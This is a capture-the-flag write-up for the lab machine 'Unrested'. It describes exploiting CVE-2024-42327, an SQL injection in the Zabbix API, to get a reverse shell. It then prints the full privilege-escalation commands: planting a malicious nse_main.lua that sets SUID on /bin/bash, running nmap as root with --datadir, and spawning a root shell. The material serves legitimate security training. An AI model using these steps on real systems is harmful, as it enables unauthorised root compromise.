Machine Overview

Unrested is a Medium difficulty Linux machine running the Zabbix 7.0.0 monitoring platform. The attack path involves exploiting CVE-2024-42327, an SQL injection vulnerability in the Zabbix API, to obtain a reverse shell. Privilege escalation is achieved by abusing a sudo misconfiguration that allows running nmap with a custom --datadir, enabling arbitrary Lua script execution as root.

Exploiting CVE-2024-42327 (SQL Injection RCE)

Searching for known vulnerabilities affecting Zabbix 7.0.0, I found CVE-2024-42327 — an SQL injection in the Zabbix API's user.get endpoint that can be chained with script.execute to achieve Remote Code Execution. The public proof-of-concept is available at: https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE.

I set up a netcat listener on port 4444, then execute the exploit script with the target URL and matthew's credentials. The exploit performs the SQL injection to escalate API privileges, then triggers a reverse shell payload via the script.execute API method.

Privilege Escalation: Nmap --datadir Abuse

Sudo Enumeration

I run sudo -l to check which commands the zabbix user can execute with elevated privileges without a password. The output reveals that nmap can be run as any user with the --datadir flag.

Exploiting Nmap's --datadir Option

The --datadir option in nmap allows specifying a custom directory for default scripts and essential nmap files. By default this points to /usr/share/nmap. A key file in this directory is nse_main.lua — the default script that is executed when using the -sC flag.

To exploit this, I create a malicious nse_main.lua file in /tmp that sets the SUID bit on /bin/bash. When nmap is run with sudo and -sC, it loads and executes this script as root, making /bin/bash a SUID binary.

zabbix@unrested:/$ echo 'os.execute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
<xecute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
zabbix@unrested:/$ sudo /usr/bin/nmap --datadir=/tmp -sC localhost
sudo /usr/bin/nmap --datadir=/tmp -sC localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-06 14:18 UTC
nmap.original: nse_main.cc:619: int run_main(lua_State*): Assertion `lua_isfunction(L, -1)' failed.
Aborted
zabbix@unrested:/$ /bin/bash -p
/bin/bash -p
